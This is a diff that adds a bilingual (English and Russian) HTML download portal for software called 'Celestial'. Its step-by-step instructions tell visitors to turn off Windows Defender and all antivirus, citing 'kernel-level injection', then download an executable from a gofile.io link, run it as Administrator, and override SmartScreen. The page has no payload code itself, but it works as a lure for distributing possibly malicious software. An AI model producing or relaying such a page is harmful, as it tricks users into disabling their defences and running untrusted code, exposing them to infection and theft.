@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Celestial | Secure Download Center</title>
+    <style>
+        :root {
+            --accent: #a349f5;
+            --bg: #05070a;
+            --card-bg: rgba(10, 12, 18, 0.9);
+            --text: #ffffff;
+            --secondary: #8a8d91;
+            --warning: #ffcc00;
+        }
+
+        body {
+            font-family: 'Inter', 'Segoe UI', sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .sea-background {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: url('image_a814de.png') no-repeat center center;
+            background-size: cover;
+            z-index: -1;
+            filter: brightness(0.3) blur(8px);
+            transform: scale(1.1);
+        }
+
+        header {
+            padding: 20px 5%;
+            background: rgba(5, 7, 10, 0.8);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(163, 73, 245, 0.2);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-text {
+            font-size: 1.5rem;
+            font-weight: 900;
+            letter-spacing: 8px;
+            text-transform: uppercase;
+            background: linear-gradient(to right, #fff, var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* Language Switcher */
+        .lang-switch {
+            display: flex;
+            gap: 5px;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 4px;
+            border-radius: 50px;
+            border: 1px solid rgba(163, 73, 245, 0.2);
+        }
+
+        .lang-btn {
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 0.65rem;
+            font-weight: 800;
+            cursor: pointer;
+            padding: 6px 14px;
+            border-radius: 50px;
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+
+        .lang-btn.active {
+            background: var(--accent);
+            color: #fff;
+            box-shadow: 0 0 10px rgba(163, 73, 245, 0.4);
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+        }
+
+        .download-card {
+            background: var(--card-bg);
+            border-radius: 30px;
+            padding: 50px;
+            border: 1px solid rgba(163, 73, 245, 0.3);
+            max-width: 650px;
+            width: 100%;
+            backdrop-filter: blur(30px);
+            box-shadow: 0 0 100px rgba(0,0,0,1);
+        }
+
+        .status-line {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.75rem;
+            letter-spacing: 2px;
+            color: var(--accent);
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+
+        .instruction-section {
+            margin: 30px 0;
+            border-left: 2px solid var(--accent);
+            padding-left: 25px;
+        }
+
+        .step { margin-bottom: 25px; }
+
+        .step-title {
+            font-size: 0.9rem;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            letter-spacing: 1px;
+        }
+
+        .step-number { color: var(--accent); font-family: monospace; }
+
+        .step-desc { font-size: 0.85rem; color: var(--secondary); line-height: 1.6; }
+
+        .warning-box {
+            background: rgba(255, 204, 0, 0.05);
+            border: 1px solid rgba(255, 204, 0, 0.2);
+            padding: 15px;
+            border-radius: 12px;
+            margin-top: 10px;
+            font-size: 0.8rem;
+            color: var(--warning);
+        }
+
+        .activation-box {
+            background: rgba(163, 73, 245, 0.08);
+            border: 1px dashed var(--accent);
+            padding: 15px;
+            border-radius: 12px;
+            margin-top: 10px;
+            font-size: 0.85rem;
+        }
+
+        .dl-btn {
+            display: block;
+            width: 100%;
+            background: #fff;
+            color: #000;
+            text-decoration: none;
+            padding: 22px;
+            border-radius: 14px;
+            font-size: 1rem;
+            font-weight: 900;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: 0.4s cubic-bezier(0.19, 1, 0.22, 1);
+            margin-top: 40px;
+        }
+
+        .dl-btn:hover {
+            background: var(--accent);
+            color: #fff;
+            box-shadow: 0 0 30px rgba(163, 73, 245, 0.6);
+            transform: translateY(-4px);
+        }
+
+        .system-specs {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255,255,255,0.05);
+            font-size: 0.7rem;
+            color: var(--secondary);
+            text-transform: uppercase;
+        }
+    </style>
+</head>
+<body>
+
+<div class="sea-background"></div>
+
+<header>
+    <div class="logo-text">Celestial</div>
+    <div class="lang-switch">
+        <button class="lang-btn active" onclick="setLang('en', this)">EN</button>
+        <button class="lang-btn" onclick="setLang('ru', this)">RU</button>
+    </div>
+</header>
+
+<div class="main-content">
+    <div class="download-card">
+        <div class="status-line" id="status-txt">
+            <span style="height: 8px; width: 8px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 10px var(--accent);"></span>
+            Secure Access Granted
+        </div>
+        
+        <h1 id="main-title" style="margin: 0; font-size: 2rem; font-weight: 900;">Deployment Portal</h1>
+        <p id="main-sub" style="color: var(--secondary); font-size: 0.9rem; margin-top: 10px;">Follow the protocols below to ensure a successful integration.</p>
+
+        <div class="instruction-section">
+            <div class="step">
+                <div class="step-title" id="s1-t"><span class="step-number">01.</span> ENVIRONMENT PREPARATION</div>
+                <div class="step-desc" id="s1-d">
+                    Disable all real-time protection shields, including Windows Defender and third-party AVs. Our kernel-level injection may be flagged as a false positive.
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-title" id="s2-t"><span class="step-number">02.</span> CORE ACQUISITION</div>
+                <div class="step-desc" id="s2-d">
+                    Download the latest binary from the secure node below. Ensure your internet connection is stable.
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-title" id="s3-t"><span class="step-number">03.</span> EXECUTION</div>
+                <div class="step-desc" id="s3-d">
+                    Run the executable as <b>Administrator</b>. If prompted by SmartScreen, click "More Info" and "Run Anyway".
+                </div>
+                <div class="warning-box" id="s3-w">
+                    ⚠️ <b>REQUIRED:</b> Ensure your Windows version is updated to 20H2 or higher.
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-title" id="s4-t"><span class="step-number">04.</span> LICENSE ACTIVATION</div>
+                <div class="step-desc" id="s4-d">
+                    Upon launching the software, you will be prompted for your <b>Unique Code</b>. This code was sent to the email address used during checkout.
+                </div>
+                <div class="activation-box" id="s4-n">
+                    <span style="color: var(--accent); font-weight: bold;">NOTICE:</span> Paste your code exactly as received. If you don't see the email, check your <b>Spam/Junk</b> folder.
+                </div>
+            </div>
+        </div>
+
+        <a href="https://gofile.io/d/LXOhfL" target="_blank" class="dl-btn" id="dl-button">
+            Initialize Download
+        </a>
+
+        <div class="system-specs">
+            <span>Version: v4.2.0-STABLE</span>
+            <span>OS: Win 10/11 x64</span>
+            <span id="sys-status">Status: <span style="color: #00ff88;">Operational</span></span>
+        </div>
+    </div>
+</div>
+
+<script>
+    const translations = {
+        en: {
+            status: "Secure Access Granted",
+            title: "Deployment Portal",
+            sub: "Follow the protocols below to ensure a successful integration.",
+            s1_t: "ENVIRONMENT PREPARATION",
+            s1_d: "Disable all real-time protection shields, including Windows Defender and third-party AVs. Our kernel-level injection may be flagged as a false positive.",
+            s2_t: "CORE ACQUISITION",
+            s2_d: "Download the latest binary from the secure node below. Ensure your internet connection is stable.",
+            s3_t: "EXECUTION",
+            s3_d: "Run the executable as <b>Administrator</b>. If prompted by SmartScreen, click 'More Info' and 'Run Anyway'.",
+            s3_w: "⚠️ <b>REQUIRED:</b> Ensure your Windows version is updated to 20H2 or higher.",
+            s4_t: "LICENSE ACTIVATION",
+            s4_d: "Upon launching the software, you will be prompted for your <b>Unique Code</b>. This code was sent to the email address used during checkout.",
+            s4_n: "<span style='color: var(--accent); font-weight: bold;'>NOTICE:</span> Paste your code exactly as received. If you don't see the email, check your <b>Spam/Junk</b> folder.",
+            btn: "Initialize Download"
+        },
+        ru: {
+            status: "Безопасный доступ разрешен",
+            title: "Портал развертывания",
+            sub: "Следуйте протоколам ниже для успешной интеграции системы.",
+            s1_t: "ПОДГОТОВКА СРЕДЫ",
+            s1_d: "Отключите все средства защиты в реальном времени, включая Windows Defender и антивирусы. Инъекция на уровне ядра может быть ошибочно помечена как угроза.",
+            s2_t: "ПОЛУЧЕНИЕ ЯДРА",
+            s2_d: "Скачайте последний бинарный файл из защищенного узла ниже. Убедитесь в стабильности интернет-соединения.",
+            s3_t: "ЗАПУСК",
+            s3_d: "Запустите файл от имени <b>Администратора</b>. При появлении SmartScreen нажмите 'Подробнее' и 'Выполнить в любом случае'.",
+            s3_w: "⚠️ <b>ТРЕБОВАНИЕ:</b> Убедитесь, что версия Windows обновлена до 20H2 или выше.",
+            s4_t: "АКТИВАЦИЯ ЛИЦЕНЗИИ",
+            s4_d: "При запуске софта вам потребуется <b>Unique Code</b>. Этот код был отправлен на почту, указанную при оформлении заказа.",
+            s4_n: "<span style='color: var(--accent); font-weight: bold;'>ПРИМЕЧАНИЕ:</span> Вставляйте код без лишних пробелов. Если письма нет, проверьте папку <b>Спам</b>.",
+            btn: "Начать загрузку"
+        }
+    };
+
+    function setLang(lang, btn) {
+        // Switch active button
+        document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+
+        // Apply translations
+        document.getElementById('status-txt').innerHTML = `<span style="height: 8px; width: 8px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 10px var(--accent);"></span> ${translations[lang].status}`;
+        document.getElementById('main-title').innerText = translations[lang].title;
+        document.getElementById('main-sub').innerText = translations[lang].sub;
+        
+        document.getElementById('s1-t').innerHTML = `<span class="step-number">01.</span> ${translations[lang].s1_t}`;
+        document.getElementById('s1-d').innerText = translations[lang].s1_d;
+        
+        document.getElementById('s2-t').innerHTML = `<span class="step-number">02.</span> ${translations[lang].s2_t}`;
+        document.getElementById('s2-d').innerText = translations[lang].s2_d;
+        
+        document.getElementById('s3-t').innerHTML = `<span class="step-number">03.</span> ${translations[lang].s3_t}`;
+        document.getElementById('s3-d').innerHTML = translations[lang].s3_d;
+        document.getElementById('s3-w').innerHTML = translations[lang].s3_w;
+        
+        document.getElementById('s4-t').innerHTML = `<span class="step-number">04.</span> ${translations[lang].s4_t}`;
+        document.getElementById('s4-d').innerHTML = translations[lang].s4_d;
+        document.getElementById('s4-n').innerHTML = translations[lang].s4_n;
+        
+        document.getElementById('dl-button').innerText = translations[lang].btn;
+    }
+
+    document.addEventListener('mousemove', (e) => {
+        const moveX = (e.clientX - window.innerWidth / 2) * 0.01;
+        const moveY = (e.clientY - window.innerHeight / 2) * 0.01;
+        document.querySelector('.sea-background').style.transform = `translate(${moveX}px, ${moveY}px) scale(1.1)`;
+    });
+</script>
+
+</body>
+</html>
